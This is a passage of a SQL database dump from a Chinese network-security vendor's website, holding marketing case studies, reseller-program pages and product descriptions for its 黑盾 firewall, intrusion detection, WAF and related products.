是实时控制区，安全保护的重点和核心； 安全区Ⅱ是非控制生产区；安全区Ⅲ是生产管理区；安全区 IV是管理信息区。\r\n\r\n•  网络防火墙系统 \r\n防火墙通过网络地址转换（NAT）功能来隐藏内部网络的IP地址; 通过其动态访问过滤\r\n\r\n功能动态检查流经的 IP数据包，根据设定的规则决定数据包是否可以通过，并将不合法的数据包过滤掉；通过其URL地址限定功能限制对某些站点的访问，防止内部网络对外部网络进行不安全的访问。 防火墙产品可以部署在安全区 I与安全区II之间及安全区III与安全区IV（横向），实现两个区域的逻辑隔离、报文过滤、访问控制等功能。对于调度数据专网条件不完善的地方，还需要考虑在调度数据接入处部署（纵向），以保证本地调度系统的安全。防火墙安全策略主要是基于业务流量的IP地址、协议、应用端口号、以及方向的报文过滤。具体选用的防火墙必须经过有关部门认可的国产硬件防火墙。推荐使用黑盾防火墙。\r\n\r\n•  网络防毒系统 \r\n网络防毒系统可以采用C/S模式，在网络防毒服务器中安装杀毒软件服务器端程序，并\r\n\r\n通过 Internet利用LiveUpdate功能，从免疫中心实时获取最新的病毒码信息。服务器和网络工作站都安装客户端软件，利用从服务器端获取的病毒码信息对本地工作站进行病毒扫描，并对发现的病毒采取相应措施进行清除。\r\n\r\n•  网络入侵检测系统\r\n\r\n入侵检测系统是专门针对黑客攻击行为而研制的网络安全产品。国际上先进的分布式入侵检测构架，可最大限度地、全天候地实施监控，提供企业级的安全检测手段。在事后分析的时候，可以清楚地界定责任人和责任事件，为网络管理人员提供强有力的保障。入侵检测系统采用攻击防卫技术，具有高可靠性、高识别率、规则更新迅速等特点。系统具有强大的功能、方便友好的管理机制，可广泛应用于电力行业各单位。推荐使用黑盾网络入侵检测系统。 \r\n以上看到，该网络综合采用了各种网络安全技术，包括防火墙、入侵检测、安全漏洞扫描、网络防病毒等。在电力系统的一些网络中还采用 VPN 等技术。这些安全技术在一定程度上保护了网络、主机和系统服务免受来自外部的攻击和破坏，对病毒的危害也能够起到一定的防范效果。但是，这些安全措施在防范来自内部的攻击，保护应用系统和信息安全方面却无能为力。“后续的工作将是在逐步完善安全体系的基础上，把建设重点由以网络安全为主应用安全为辅转入以应用安全为主网络安全为辅的阶段。” 信息安全解决方案应该全面考虑信息存储、传输、处理和访问等各环节的安全要求$$$安全的身份认证是安全的第一步，不安全的身份认证可能造成用户假冒，使其它安全措施失去作用。$$$对关键应用的数据与应用系统进行备份，确保数据损坏、系统崩溃情况下快速恢复数据与系统的可用性。$$$采用数据加密、信息摘要和数字签名等安全措施对通信过程中的信息进行保护，实现数据在通信中的保密、完整和不可抵赖性安全要求。 $$$通过文件加密、信息摘要和访问控制等安全措施，来实现文件存储和传输的保密和完整性要求，并实现对文件访问的控制。$$$通过数据存储加密、完整性检验和访问控制来保证数据库数据的机密和完整性，并实现数据库数据的访问安全。$$$通过记录审计信息来为信息安全问题的分析和处理提供线索。','/uploads/img1/20170616/5943a259c6d3a.gif','福建省水口发电有限公司 、龙岩电厂 、福建安砂水力发电厂 、闽东水电开发有限公司 、福建电力培训中心');
INSERT INTO `xyh_page_detail` VALUES ('20','50','长富乳业集团让黑客无机可乘','福建长富乳业集团股份有限公司创建于 1998 年 3 月，自创建以来，坚持以科技为先导，以创新经营为突破口，以产业链为纽带，严格按照市场经济规律进行运营，获得“农业产业化国家重点龙头企业”、农业部“全面质量管理达标单位”、“福建省调整优化经济结构重点企业”等荣誉，并在省内乳品行业中率先通过 ISO9002 国际质量体系认证。长富乳业集团全面致力于原料奶采集的国际化全体系高端标准控制，依照欧美等乳业发达国家标准，进行集约化牧场建设，并成功实施信息化带动工业建设的战略，已成为我国原料奶品质控制最好、技术装备全面国际化的大型专业乳制品生产企业。','安全之道在于未雨绸缪$$$防微杜渐，安全无忧$$$树立为企业提供网络安全解决方案的典范','在科学技术发展的今天，计算机和计算机网络正在逐步改变着人们的工作和生活方式，尤其是网络系统的广泛应用更为高速成长的长富集团在管理、运营和统计等方面带来了前所未有的高效和快捷。\r\n\r\n但同时计算机网络的安全隐患亦日益突出，随着越来越多黑客案件的报道，长富人不得不意识到黑客的存在。企业 INTERNET/INTRERNET 的建立和网络规模的日益扩大，网络结构及使用设备日趋复杂，如何有效地管理网络系统，提高系统的安全性，已是长富人迫切需要解决的重要难题之一。黑客利用企业网络的安全漏洞，不经允许非法访问企业内部网络或数据资源，从事删除、复制甚至毁坏数据的破坏活动。或者通过寻找未设防的路径进入网络或个人计算机，一旦进入，他们便能够窃取数据、毁坏文件和应用、阻碍合法用户使用网络，所有这些都会对企业造成危害。企业网络安全不仅仅是一项技术问题，它已成为市场竞争中的一个必要条件。一旦长富集团开始接受信用卡订单、存储客户地址或处理客户、生产厂商以及合作伙伴的各类私密信息，就应该保证数据不会被非法窃取。如果被一个怀有恶意的黑客破环，就会导致重要文件破坏甚至丢失，更为严重的是，这将会严重影响企业的发展和成功。\r\n\r\n另外还有一种潜在的黑客攻击行为是拒绝服务。这类攻击一般能使单个计算机或整个网络瘫痪，黑客使用这种攻击方式的意图很明显，就是要阻碍合法网络用户使用该服务或破坏正常的商务活动。例如，通过破坏两台计算机之间的连接而阻止用户访问服务；通过向企业的网络发送大量信息而堵塞合法的网络通信，最后不仅摧毁网络架构本身，也破坏整个企业运作。$$$为什么长富集团会从几十家防火墙产品中选择海峡信息的黑盾防火墙作为防御黑客攻击的解决方案呢？这得从黑盾防火墙优越性能说起，黑盾防火墙构架于企业内部网与外部之间，能够对所有企图进入内部网络的流量进行监控。黑盾防火墙产品优越功能体现在：包状态检查 : 在数据包通过防火墙时对数据进行检查，以确定是否允许进入局域网络、流量控制 : 根据数据的重要性管理流入的数据、虚拟专用网 (VPN) 技术 : 使远程用户能够安全地连接局域网。长富集团采用黑盾防火墙的 VPN 技术，利用加密隧道 (tunnel) 构成的远程安全链路与远在内蒙古等地的分部进行安全通讯，同时保证一个远程用户也可以通过建立一条连接长富集团局域网的 VPN 链路来安全地访问企业内部数据、 Java 、 ActiveX 以及 Cookie 屏蔽 : 只允许来自可靠 Web 站点上的应用程序运行、代理服务器屏蔽 (Proxy blocking): 防止局域网用户绕过互联网过滤系统、内容监控 : 能够阻塞带有特定词句的发送，以避免企业员工故意或无意的泄露某些特定信息$$$经过多年发展和实践探索，海峡信息已经为长富集团提供一套完整的网络安全解决方案，包括建立集团的安全政策，掌握保障安全性所需的基础技术，并规划好发生特定安全事故时企业应该采取的方法。制定一个组织机构的战略性安全指导方针，并为实现这个方针分配必要的人力物力。\r\n\r\n技术与管理相结合：技术与管理不是孤立的，对于一个信息化的大型企业来说，网络信息安全不仅仅是一个技术问题，也是一个管理问题。要保证长富集团网络系统安全的关键，首先要做到重视安全管理，不要“坐以待毙”，可以说，长富集团的信息安全，是一个整体的问题，只有从管理与技术相结合的高度，制定与时俱进的整体管理策略，并切实认真地实施这些策略，才能达到提高企业信息系统安全性的目的。\r\n\r\n　实施与风险评估并重：帮助长富集团了解自身有哪些系统已经联网、企业网络有哪些弱点、这些弱点对企业运作都有哪些具体风险，以及这些风险对于公司整体会有怎样的影响。所有的安全政策，都由一套完善的管理控制架构所支持，建立完整的安全性解决方案。\r\n\r\n产品是形式，服务是保证：海峡信息除了为长富集团提供高性能、功能卓越的防火墙产品外，更重要的是为之提供一系列高质量、规范化的网络安全服务。我们有理由相信，谁能更好的把握用户需求，提供更贴身的安全服务，并确保服务的质量，谁将有可能成为明天网络安全市场新的主导者。 ','','福建东南电化集团 、广西联发集团 、大亿灯具 、新大陆科技集团 、三钢集团 、长富集团 、福建日立 、亚通科技 、锦厦科技. \r\n');
INSERT INTO `xyh_page_detail` VALUES ('21','51','金融证券系统对黑客说“不”','金融网络系统由于涉及信息的敏感性自然会成为内部和外部黑客攻击的目标，面临的主要风险和威胁有： 非法访问：现有网络系统利用操作系统网络设备进行访问控制，而这些访问控制强度较弱，攻击者可以在任一终端利用现有的大量攻击工具发起攻击；由于整个网络通过公用网络互联同样存在连接终端进行攻击的可能；另一方面银行开发的很多增值业务、代理业务，存在大量与外界互连的接口，这些接口现在没有强的安全保护措施，外部网络通过这些接口攻击银行，可能造成巨大损失。 \r\n　　 窃取PIN/密钥等敏感数据：一般银行信用卡系统和柜台系统采用的是软件加密的形式保护关键数据，安全的关键是对加密密钥的保护，而软件加密最大的安全隐患是无法安全保存加密密钥，程序员可修改程序使其运行得到密钥从而得到主机中敏感数据。 \r\n　　 假冒终端/操作员：银行网络中存在大量远程终端通过公网与银行业务前置机相连，国内银行已出现多起在传输线路上搭接终端的案例，因此一般金融网络存在大量类似安全隐患。现有操作员身份识别惟一，但口令的安全性非常弱因此存在大量操作员假冒的安全风险。 \r\n　　 截获和篡改传输数据：网络系统通过公网传输大量的数据没有加密，由于信息量大且采用的是开放的TCP/IP，现有的许多工具可以很容易的截获、分析甚至修改信息，主机系统很容易成为被攻击对象。其他安全风险：主要有病毒、系统安全（主要有操作系统、数据库的安全配置）以及系统的安全备份等','黑盾金融系统网络安全解决方案$$$通迅线路数据加密$$$防火墙自身的保护$$$结束语','从金融网络的各种业务、总行和分行的连接和 OA系统、网上银行各方面进行网络安全方面的设计： 防止来自外部的黑客攻击、防止来自内部的恶意攻击、网络资源访问控制 、网络传输的实时监控、强大的安全审计、事件分析与告警。\r\n\r\n网络的对外出口处以及在总行和分行之间的连接都设置防火墙将是最理想的选择，对外防止黑客入侵，对内以防止内部人员的恶意攻击或由于内部人员造成的网络安全问题。在总行与分行连接点采用黑盾防火墙 4000系列，同时在重要的业务连接点采用双机热备技术，保证业务连续性。由于分行与INTERNET都有出口，也带来了一定的风险，建议在连接INTERNET的出口上配置黑盾防火墙4000系列。一般银行的通信线路涉及到：X.25、FR、DDN、ISDN、拨号等通信接口和协议，因此，最佳的方案是在网络层上采用先进的防火墙和VPN技术，以有效的阻止外来的攻击和保证业务数据在公网上的安全传输，同时在应用层上提供对敏感数据加密消息进行完整性鉴别及密钥管理。因此可以通过各级分行节点配备具有VPN模块的黑盾防火墙4000系列来保证IP包的机密性。在业务系统中保护用户敏感信息防止信息被非法篡改，实现对业务数据加密、身份认证等安全功能。$$$在银行的广域网传输系统中，从总行到分行、分行到支行、支行到分理处等，广泛应用到帧中继、 X.25、DDN、PSTN等等之类的通用线路，但这些线路大多数都是由通讯公司提供，与许多用户在一套系统上使用他们的业务，由于这些线路都是暴露在公共场所，这样很容易造成数据被盗。传输数据当中如果不进行数据加密，后果可想而知。所以对数据传输加密这是一非常重要的环节。 \r\n　　 对网络数据加密大致分为以下几处区域： \r\n　　 · 应用层加密 \r\n　　 建立应用层加密，应用程序对外界交换数据时进行数据加密。主要优点是使用方便、网络中数据从源点到终点均得到保护、加密对网络节点透明。缺点是某些信息以明文形式传输，容易被分析。此种加密已被广泛应用于各应用程序当中，并有相应的标准。 \r\n　　 · 基于网络层的数据加密 \r\n　　 在总部到各分行，以及分行到支行采用VPN加密技术进行数据加密。 VPN是通过标准的加密算法，对传输数据进行加密，在公用网上建立数据传输的加密“隧道”。加密实现是在IP层，与具体的广域网协议无关，也就是说适应不同的广域网信道（DDN、X.25、帧中继、PSTN等）。由于VPN技术已经拥有标准，因此所有的VPN产品可以实现互通。$$$要保护网络的安全，防火墙本身首先要保证安全，由于防火墙系统供电、硬件故障、异常死机等特殊情况的发生，可能使防火墙系统瘫痪阻碍网络通讯，导致网络安全性无法保证。对于需要高度可靠性的用户如金融、证券、电信、电力、政府、能源等部门，一定要选用具有双机热备功能的防火墙。黑盾防火墙防火墙的双机热备功能即在同一个网络节点使用两个配置相同的防火墙，正常情况下一个处于工作状态，另一个处于备份状态，当工作状态的系统出现故障时，备份状态的防火墙自动切换到工作状态，并保证网络的正常使用。备用防火墙系统能够在一秒钟的时间内完成整个切换过程，切换过程不需要人为操作和除两个防火墙以外的其他系统的参与，真正做到有备无患。 $$$网络安全是一个系统的、全局的管理问题，网络上的任何一个漏洞，都会导致全网的安全问题，我们应该用系统工程的观点、方法，分析网络的安全及具体措施。安全措施主要包括：行政法律手段、各种管理制度（人员审查、工作流程、维护保障制度等）以及专业措施（识别技术、存取控制、密码、低辐射、容错、防病毒、采用高安全产品等）。一个较好的安全措施往往是多种方法适当综合的应用结果。一个计算机网络，包括个人、设备、软件、数据等。这些环节在网络中的地位和影响作用，也只有从系统综合整体的角度去看待、分析，才能取得有效、可行的措施。即计算机网络安全应遵循整体安全性原则，根据规定的安全策略制定出合理的网络安全体系结构。这样才能真正做到整个系统的安全。','/uploads/img1/20170616/5943a363d30c8.gif|||/uploads/img1/20170616/5943a379d18e6.gif','华夏银行 、泉州市商业银行 、中国建设银行 、厦信证券 、泉州市农村信用合作社系统');
INSERT INTO `xyh_page_detail` VALUES ('22','52','分销合作理念','福建省海峡信息技术有限公司作为一家专业从事网络安全产品研发、销售和网络安全整体解决方案的一流供应商，我们的业务拓展方针是通过业内同行合作伙伴向最终用户提供服务和产品，本着“诚信 协作 共赢”的渠道合作原则，我们将致力于构建一个立体式的完整合作代理渠道。我们将把产品的开发与生产、总体的市场推广、销售渠道的建设以及全力支持代理商的工作作为公司最重要的任务。我们相信，我们能够根据合作者的实际情况与发展理念，共同探讨最符合双方的合作方案，以求实现优势互补，建立一种互相信任、理解、尊重与支持的长远关系。','代理商资格的获取$$$代理商级别管理$$$结语','1) 区域（领域）独家代理商\r\n在某一地域或某一领域（行业）具有独特的市场优势的代理商，在向我司作出了双方认同的年度最低销售任务的承诺并与我司签定相关协议后，即可取得在这一范围内的独家代理商资格。独家代理商又分为白金代理、金牌代理、银牌代理三个级别\r\n2) 普通正式签约代理商\r\n这类分销伙伴并不要求在某一范围的独家代理资格，在与我司签定相关协议后即成为我司代理商。一般情况下，双方会制定一个主要销售区，但该分销伙伴有权在所有非独家代理区域内进行销售活动。$$$我司对不同级别的代理商实行不同的优惠政策，银牌代理商的定货价与普通代理商相同但拥有区域独家代理权，金牌代理商的定货价为普通代理商的 95% ，白金代理商的定货价为普通代理商的 90%\r\n\r\n取得我司银牌独家代理商资格的方式有两种：\r\n1 ）代理商在一次性预付给甲方一定金额的保证金并与我司签定协议后，即成为我司银牌代理商，银牌代理商的销售额在达到金牌代理商标准后自动升级成为金牌代理商，在销售额达到白金代理商的标准后升级成为白金代理商；如代理商在一年内完成代理任务，我司将退还保证金；如代理商在签定协议起满一年后无法达到相应级别代理商的要求，可向我司申请取消独家代理资格，我司将在取消该代理商独家代理资格后退还所有保证金。\r\n2 ）普通的代理商在年度销售额达到金牌代理商销售额的标准后，即可向我司申请独家代理资格，经我司考察确认后，无须交纳保证金即可成为我司产品银牌独家代理商白金和金牌代理商均由银牌代理商升级产生。$$$各级别的独家代理商应在签约后按阶段完成进货任务，如果代理商无法完成阶段任务，我司将会取消或降低该代理商的资格或级别。我司与代理商的协议一年一签，当一年合作期满时，代理商完成进货任务，我司将赠送代理商完成进货总量的 一定数额 的产品额度作为给代理商的奖励。.','','');
INSERT INTO `xyh_page_detail` VALUES ('23','53','渠道支持','福建省海峡信息技术有限公司对代理商的培训内容主要定位在两个方面：技术支持培训和销售技能培训。','技术支持培训$$$销售技能培训$$$总结','包括专门为合作伙伴举办的一系列培训课程及活动，包括安全产品的分类；安全产品的基本概念和原理以及作用、重要性及局限性；安全产品的安全策略；典型安全产品的自身安全与日常维护；典型安全产品的配置演示；产品与技术更新、行业解决方案等。为代理商培训技术人员，由我司技术人员到代理商处，或代理商的技术人员到我司的培训中心，进行详细的技术培训，并提供所需技术资料；对于代理商组织或参加的会议，如有需要，我司可派技术人员前往作产品介绍、演示或技术咨询；对于双方的合作初期（ 3 个月左右），针对代理商较重要的客户，应代理商要求，我司可派技术人员前往现场做技术讲解；对于双方的合作初期，针对较重要的客户的产品安装，应代理商要求，我司可派技术人员到现场做指导；当代理商在争取客户时，应代理商要求，我司技术部可尽量提供完善的客户解决方案，以帮助代理商争取客户。售前技术培训，目前，从部分已有合作伙伴实施效果来看，这一系列培训为加强合作伙伴的售前技术支持能力起到了举足轻重的作用。$$$海峡信息特别开设了两项内容 -- 销售技能培训与领导技能培训。 产品销售技能培训包含产品功能演示技巧、销售技能以及销售案例分析。 在这里，海峡信息的资深销售经理可以系统而深入地教授关于怎样才能成功赢得关键性大订单的指导。$$$建立完整的、专业化的合作伙伴支持及服务队伍，建立完善的支持与服务体系，是福建省海峡信息技术有限公司渠道建设中的关键环节。合作伙伴是福建省海峡信息技术有限公司不断发展的重要资源，与合作伙伴同舟共济，为他们提供全面的管理与服务支持，这不仅是对合作伙伴的承诺，也是海峡信息公司不断壮大的要求。福建省海峡信息技术有限公司愿意与广大合作伙伴一起为推动国家信息安全事业的发展，成为国内最具影响力的网络安全整体解决方案的提供商而共同努力！','','');
INSERT INTO `xyh_page_detail` VALUES ('24','35','大数据协同应用管理解决方案','','科技计划项目管理解决方案$$$科学技术奖励管理解决方案$$$纪检监察管理解决方案$$$创新券管理解决方案','根据全局规划和顶层设计，建立系统、全面的科技项目管理解决方案，实现科技业务全流程管理的信息化、系统化、规范化、智能化。主要功能有：专家管理、单位管理、申报管理、初审管理、网络评审管理、会议评审、管理评审、综合评审、立项管理、经费计划文管理、任务书管理、执行情况管理、任务书变更管理、验收管理、辅助决策分析管理、协调管理、通知公告管理、系统管理等$$$提供面向省、市两级科学技术奖励的申报、评审、管理全过程的信息化、系统化、规范化、智能化的解决方案,提高奖励管理部门工作效率、降低办公成本,进一步提升科技奖励评审的科学性、公平性、公正性、公开性和准确性。主要功能有：专家管理、单位管理、申报管理、形审管理、网评管理、复评管理、终评管理、辅助决策分析管理、协调管理、通知公告管理、系统管理等。$$$提供科技项目全流程预警、监控、防范、监管的全套解决方案。主要实现对科技项目管理工作进行有效监管，对科技项目管理等科技行政管理主要行政权力，实行预警提示、实时监控，超前防范、动态监管，有力推动了科技行政管理部门勤政廉政建设。系统多次获得纪检部门领导的充份肯定，是我省厅级部门中最早建成并投入使用的对业务系统行政权力实施监管、监控的监察管理信息系统。$$$为加强科技创新券的管理，推动科技资源开放共享，引导中小微企业持续加大研发经费投入，营造大众创业、万众创新良好环境。创新券管理解决方案主要实现创新券的在线申报、推荐、审核、补助的全过程管理。','','福建省科学技术厅  福建省交通运输厅  福建农林大学  福建省科学技术奖励委员会  福建省科技型中小企业技术创新资金管理中心\r\n福州市科学技术局 漳州市科学技术局  泉州市科学技术局 莆田市科学技术局  三明市科学技术局  南平市科学技术局  龙岩市科学技术局 宁德市科学技术局 ');


# 转存表中的数据：xyh_picture 


# 转存表中的数据：xyh_product 
INSERT INTO `xyh_product` VALUES ('12','黑盾朗易IT运维管理系统系统','','','/uploads/img1/20170614/594104c687175.jpg!300X300.jpg','/uploads/img1/20170614/594104c687175.jpg$$$$$$','',' 黑盾朗易IT运维管理系统系由福建省海峡信息技术有限公司与北京中科朗易科技有限责任公司强强合作开发的IT运维管理软件。作为行业领先的网络管理解决方案提供商，福建省海峡信息技术有限公司致力于它从业务角度帮助客户有效管理和优化IT 环境的运营效率，实现 IT基础架构的全方位监控，优化IT 服务流程，提升IT 服务质量。','0.00','0.00','','','','1498792219','1498792219','27','29','1','1','','0','0','1','网络管理系统$$$$$$|||先进的体系架构$$$$$$|||业务管理系统$$$$$$|||$$$$$$|||$$$$$$','','','','全面监控网络设备的性能，通过SNMP主动采集网络设备的CPU、内存、配置信息等。7*24小时持续运行监控，深入洞察网络设备运行状况，提前预知运行风险。$$$$$$|||基于模型驱动理念的组件化管理平台，具备强大的二次开发能力；组件化分布式设计，模块松耦合，系统易扩展，基于源语解析的通用采集引擎技术，支持各种主流采集技术$$$$$$|||业务管理系统以业务角度为核心，全面管理和监控应用服务器、数据库、中间件等资源。$$$$$$|||$$$$$$|||$$$$$$');
INSERT INTO `xyh_product` VALUES ('14','黑盾网络入侵检测系统','','','/uploads/img1/20170614/5940e49b68751.png!300X300.jpg','/uploads/img1/20170614/5940e49b68751.png$$$$$$','','黑盾网络入侵检测系统(HD-IDS)以模式匹配技术为主，结合人工智能异常发现技术，采用高速网络数据采集技术，结合独特的硬件和软件优化，提高检测分析速度，将网络探测器变得更快速，提供更准确和灵活的入侵检测。HD-IDS主要应用在业务管理有多层次的结构，网络结构较复杂的单位。它管理、配置简单，非专业人员也能容易地对网络实施监控保护。','0.00','0.00','','','','1499065702','1499065702','49','22','1','1','','0','0','1','强大的网络安全防护体系$$$$$$|||实时攻击检测$$$$$$|||APT事件分析$$$$$$|||分布式安全策略实施$$$$$$|||智能报警系统$$$$$$','政务$$$$$$|||企业$$$$$$','黑盾百兆入侵检测系统运用了先进的动态特征检测技术，全透明的监控网络数据流，实时预防入侵者利用网络中可能存在的成千上万个已知和未知的安全性漏洞所进行的攻击，同时配备强大入侵规则配置向导，可使网络管理员轻松定义和部署新的或定制的入侵规则，从而有效提高政务信息网的安全防护功能。$$$$$$|||对于企业网来讲，如果对内部网络缺乏相应的安全措施，则无法监测内部用户的行为。一旦发 生内部攻击或用户误操作，将对内部局域网造成较大危害，而网络管理人员根本无法监控，因此，我们建议在交换机上安装黑盾网络入侵检测系统，实现对内网和外网用户数据传输与访问服务的全面监控，达到记录、报警、阻断、事后审计等功能。$$$$$$','/uploads/img1/20170615/5941f624e6483.jpg$$$$$$|||/uploads/img1/20170615/5941f6296730e.jpg$$$$$$','运用先进的动态特征检测技术，全透明的旁路方式监控网络数据流，实时预防入侵者利用网络中可能存在的成干上万个已知和未知的安全性漏洞所进行的攻击，同时配备强大入侵规则配置向导，可使网络管理员轻松定义和部署新的或定制的入侵规则，从而有效提高企业网络的安全防护功能。$$$$$$|||采用先进的网络侦测技术，可以自动发现网络主机和应用程序，然后动态地应用相应的攻击特征规则，可实时监测常见的和新的攻击，包括DOS、DDOS、木马、后门。检测多种针对Finger、FTP、NetBIOS、RPC、SMTP、Telnet服务的攻击，检测缓冲区溢出类型攻击等，而不会对网络和应用程序性能产生影响。$$$$$$|||自主开发黑盾APT事件分析引擎，实时扫描和初步筛选已发现的安全事件；对海量事件做关联性分析，发掘出复杂的海量安全日志和事件背后隐藏的关联性信息，依此得到准确的安全事件的整个攻击路径；通过记录热点攻击事件，对网络内局部安全热点事件做出趋势性研判，推演未来的攻击趋势；并且对大量的安全事件进行过滤、压缩、归并、降噪处理，提取出少量的、概括性的重要安全事件。$$$$$$|||企业级安全管理平台将整个网络的所有入侵检测系统引擎综合到一个统一的管理平台中，使整个安全体系易于部署和管理，并且执行统一策略，从而降低安全系统管理费用$$$$$$|||通过入侵行为分析，判断出黑客攻击手段，同时提供多种报警方式，包括：声音报警、E-mail报警、SNMP TRAP报警、NETBIOS报警，并提供了一个防火墙联动Agent，可以和世界上应用广泛的几种防火墙进行联动$$$$$$');
INSERT INTO `xyh_product` VALUES ('15','黑盾数据库安全审计系统','','','/uploads/img1/20170615/5941dd91cbbca.jpg!300X300.jpg','/uploads/img1/20170615/5941dd91cbbca.jpg$$$$$$','','随着信息化的发展，信息安全建设的中心由网络防护向数据防护转移，因此对于承载数据的容器——数据库，已然成为安全威胁的重点。数据库安全控制已经受到了广泛的关注，与网络安全、系统安全以及协议安全一起构成了信息系统安全的四个主要研究领域。福建省海峡信息技术有限公司自主研发了“黑盾数据库安全审计系统”，以全面保障数据库的完整性、保密性和可用性。\r\n      ','0.00','0.00','','','','1498789805','1498789805','91','23','1','1','','0','0','1','数据库语句翻译$$$$$$|||基于业务行为的操作审计$$$$$$|||业务性能分析$$$$$$|||特权账号与风险操作监控$$$$$$|||高性能海量数据挖掘$$$$$$','医疗应用$$$$$$|||财政应用$$$$$$','某医院收到用户举报，存在统方行为，需要尽快定位责任人。同时经常遇到专家医师投诉，莫名插号多位患者，导致无法正常下班。基于这两个棘手的问题，用户选择了黑盾数据库审计系统，经过历时3个月努力终于抓捕到了犯罪分子。$$$$$$|||某财政厅，经常遇到业务科室操作不当，未经审批直接要求数据库管理员修改后台数据；系统运行多年后，时长出现运行缓慢的情况，升级了硬件配置，仍无法改善；希望和业务系统结合，及时发现支付申请与支付审批不相符的情况。通过部署黑盾数据库审计系统后，解决了以上困扰用户的问题。\r\n经过审计数据分析，用户数据库操作响应正常，问题原因在网关设备，因存在协议解析问题，在IP头部放大到32位时，会出现间歇性中断的情况。通过与应用的结合记录申请和审批的资金情况，并建立关联关系，一旦出现不相符情况，立刻记录事件并报警。此外，利用数据库审计，监控特权账号的操作和关键数据表的修改，发现问题时能定位责任人，并提供相关操作明细。$$$$$$','/uploads/img1/20170614/5940ef4a3a8db.jpg$$$$$$|||/uploads/img1/20170614/594108addba6e.png$$$$$$','系统支持将复杂嵌套的数据库语句，转译为普通用户可以直接阅读的中文，让更多不了解数据库的用户，能无障碍的使用该系统。系统支持标准的SQL语句和Cache语句。$$$$$$|||与用户实际业务结合，关注关键操作流程和敏感数据表，一旦发现异常，立即将审计结果以用户业务视角加以展示告警，避免大量的数据库语言，让用户无从入手$$$$$$|||以旁路方式接入用户网络，24小时不间断的对核心数据进行采集分析，可为用户提供以下分析结果：1、每日和每周的业务繁忙高峰，并提供具体峰值；2、提供对业务性能消耗最大的操作内容，并提供日触发次数；3、以力导向布局图和明细数据的方式实时监测当前连接会话。$$$$$$|||通过对系统特权权限账号的监管和高危操作的监控，避免敏感数据的流失。$$$$$$|||完整记录对数据库的所有操作，以达到全审计的目的。以便用户在未知风险事件发生后，定位问题的发生过程。$$$$$$');
INSERT INTO `xyh_product` VALUES ('16','黑盾网络入侵防御系统','','','/uploads/img1/20170615/5941de076a325.jpg!300X300.jpg','/uploads/img1/20170615/5941de076a325.jpg$$$$$$','','黑盾入侵防御系统（HD-IPS）是福建省海峡信息技术有限公司针对目前流行的蠕虫、病毒、木马、间谍软件、DDOS攻击、SQL注入等黑客攻击行为，以及P2P下载、IM即使通讯、网游等网络资源滥用问题退出的全新安全防护方案，在漏洞库的基础上，继承了专业病毒库和应用协议库，是针对系统漏洞、协议弱点、病毒蠕虫、DDoS攻击、间谍软件、恶意攻击、流量异常等威胁的一体化应用层深度防御平台。以全面深入的协议分析技术为基础，结合协议异常检测、状态监测、关联分析形成的新一代检测引擎','0.00','0.00','','','','1498790222','1498790222','94','24','1','1','','0','0','1','业界最高应用层防护性能$$$$$$|||应用识别与威胁特征库APP-ID$$$$$$|||多重高可靠性保障机制$$$$$$|||高效全面防护$$$$$$|||强大的管理与报表功能$$$$$$','','','','独有的高性能硬件架构APP-X，可提供高性能的应用层防护。设备性能不受特征库大小、策略数条目的影响，全部安全策略可以一次匹配完成，即使在特征库不断增加的情况下，也不会造成性能的下降和网络时延的增加。$$$$$$|||具有一只专业的特征库团队，实时跟踪国内外最新的安全技术，提供集漏洞库、病毒库、协议库于一体的应用识别和威胁特征库APP-ID，特征库完全兼容CVE，能及时有效的抵御各种最新的应用层安全攻击。$$$$$$|||支持在线模式、监听模式、混合模式，可以在IPV4/IPV6双栈、MPLS等复杂网络环境下良好的工作，具备面向下一代网络的各种特征。$$$$$$|||内置专业病毒库，可提供数十万条病毒库，支持防御文件类型、网络型和混合型等各类病毒，支持新一代虚拟脱壳和行为判断技术，准确查杀各种变种病毒、未知病毒。$$$$$$|||提供便捷的图形化管理界面，支持Web GUI SSH、串口Console，并支持通过UMC网管平台集中管理。支持独立的日志服务器，日志可自动定时备份；内置数百种报表，可图形化查询、审计、统计、检索内网用户的各种网络行为日志，方便管理者了解和掌控网络。$$$$$$');
INSERT INTO `xyh_product` VALUES ('17','黑盾WEB应用防护抗攻击系统','','','/uploads/img1/20170614/5941047007069.jpg!300X300.jpg','/uploads/img1/20170614/5941047007069.jpg$$$$$$','','    黑盾WEB应用防护抗攻击系统（以下简称黑盾WAF）是福建省海峡信息技术有限公司结合多年在应用安全理论与应急响应实践经验积累的基础上，自主研发的一款应用级防护系统。在提供WEB应用实时深度防御的同时，实现WEB应用加速与防止敏感信息泄露的功能，为WEB应用提供全方位的防护解决方案。广泛应用于政府、教育、卫生、电力、金融等行业，帮助用户解决目前所面临的各类网站安全问题，如：注入攻击、跨站脚本、脚本木马、缓冲区溢出、信息泄露、应用层CC攻击、DDoS攻击等常见及最新的安全问题。','0.00','0.00','','','','1498790518','1498790518','24','25','1','1','','0','0','1','三位一体化WEB安全防护体系$$$$$$|||网页防篡改$$$$$$|||云防护模式$$$$$$|||双操作系统$$$$$$|||专业DDOS防护引擎$$$$$$','','','','采用“事前评估、事中评估、事后审计”三位一体化的防护体系$$$$$$|||网页防篡改模块实时监控网页请求合法性、拦截篡改攻击企图，保障网站公信度$$$$$$|||推出云防护模式，客户只需一个简单的设置，就可以对异地网站进行统一管理、统一监控、统一防护、统一漏洞$$$$$$|||采用独特的双操作系统——在同一系统平台上运行两套操作系统，当其中一套系统运行异常时可以自动切换至另一套系统，保证系统平滑的进行规则库、版本升级、核心引擎升级，避免可能的中断客户网络应用的情况发生$$$$$$|||采用主动监测加被动跟踪相互结合的防护技术，可辩识多种DDoS攻击，并启用特有的阻断。$$$$$$');
INSERT INTO `xyh_product` VALUES ('18','黑盾安全网关系统','','','/uploads/img1/20170615/5941dd37aa1cc.jpg!300X300.jpg','/uploads/img1/20170615/5941dd37aa1cc.jpg$$$$$$','','HD-SGS是桌源于未来互联网发展趋势打造的高性能防病毒网关产品，它是福建省海鲜信息技术有限公司多年研究成果。它集病毒过滤、恶意网址过滤、僵尸网络防护、主动内容关键字过滤四大功能为一身，兼顾病毒入侵防护与网关数据安全防护，是政府、企事业单位网络安全防护解决方案中不可或缺的过滤利器。','0.00','0.00','','','','1498791294','1498791294','22','26','1','1','','0','0','1','多核并行控制技术$$$$$$|||非共享式TCP协议栈$$$$$$|||单板线速病毒过滤$$$$$$|||主动与被动结合的数据外泄防护$$$$$$|||病毒感染和传播防护$$$$$$','','','','海峡信息开发的多核并行控制器用于处理核内、核间人物的分工与调度。来自网络层的数据包进入多核并行控制器后会被均衡的分配到各个不同的CPU，以便完成后续多